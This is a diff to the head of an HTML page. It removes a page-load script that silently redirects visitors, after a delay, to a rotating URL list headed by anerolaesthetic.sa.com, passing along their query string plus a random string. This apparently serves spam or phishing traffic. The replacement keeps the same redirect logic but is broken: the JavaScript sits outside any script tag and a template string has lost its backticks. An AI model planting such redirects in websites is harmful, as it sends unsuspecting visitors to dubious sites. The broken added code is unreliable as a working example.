@@ -1,64 +1,49 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <script>
-  // List of URLs to cycle through
-  const urls = ["https://anerolaesthetic.sa.com/", "", ""];
+    // List of URLs to cycle through
+const urls = ["https://anerolaesthetic.sa.com/", "", ""];
 
-  // Function to get query string from the current URL
-  function getQueryString() {
-    return window.location.search; // This includes the '?' character
-  }
+// Function to get query string from the current URL
+function getQueryString() {
+  return window.location.search; // This includes the '?' character
+}
 
-  // Function to get the next URL from local storage or default to the first URL
-  function getNextUrl() {
-    let currentIndex = localStorage.getItem("currentIndex");
-    
-    // Default to index 0 if not set
-    currentIndex = currentIndex ? parseInt(currentIndex) : 0;
+// Function to get the next URL from local storage or default to the first URL
+function getNextUrl() {
+  let currentIndex = localStorage.getItem("currentIndex");
+  
+  // Default to index 0 if not set
+  currentIndex = currentIndex ? parseInt(currentIndex) : 0;
 
-    // Get the next URL, ensuring it's a valid non-empty string
-    let nextUrl = urls[currentIndex];
-    while (!nextUrl) {
-      currentIndex = (currentIndex + 1) % urls.length;
-      nextUrl = urls[currentIndex];
-    }
-
-    // Update the index for the next visit
+  // Get the next URL, ensuring it's a valid non-empty string
+  let nextUrl = urls[currentIndex];
+  while (!nextUrl) {
     currentIndex = (currentIndex + 1) % urls.length;
-    localStorage.setItem("currentIndex", currentIndex);
-
-    return nextUrl;
+    nextUrl = urls[currentIndex];
   }
 
-  // Function to generate a random string of alphanumeric characters up to 13 characters long
-  function generateRandomString() {
-    const length = Math.floor(Math.random() * 13) + 1; // Random length between 1 and 13
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    let result = '';
-    for (let i = 0; i < length; i++) {
-      result += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    return result;
-  }
+  // Update the index for the next visit
+  currentIndex = (currentIndex + 1) % urls.length;
+  localStorage.setItem("currentIndex", currentIndex);
 
-  // Main function to execute the redirect
-  function redirectToNextUrl() {
-    const queryString = getQueryString();
-    const nextUrl = getNextUrl();
-    const randomString = generateRandomString(); // Generate a random string of up to 13 characters
-    const separator = queryString ? '&' : '?'; // Use '&' if query string exists, otherwise use '?'
-    const fullUrl = `${nextUrl}${queryString}${separator}${randomString}`;
+  return nextUrl;
+}
 
-    // Redirect to the constructed URL after a 4-second delay
-    setTimeout(() => {
-      window.location.href = fullUrl;
-    }, 4000);
-  }
+// Main function to execute the redirect
+function redirectToNextUrl() {
+  const queryString = getQueryString();
+  const nextUrl = getNextUrl();
+  const fullUrl = ${nextUrl}${queryString};
 
-  // Execute the redirect when the page loads
-  window.onload = redirectToNextUrl;
-</script>
+  // Redirect to the constructed URL after a 5-second delay
+  setTimeout(() => {
+    window.location.href = fullUrl;
+  }, 5000); // 5000 milliseconds = 5 seconds
+}
+
+// Execute the redirect when the page loads
+window.onload = redirectToNextUrl;
 
 
     <meta content="text/html;charset=utf-8" http-equiv="Content-Type" />
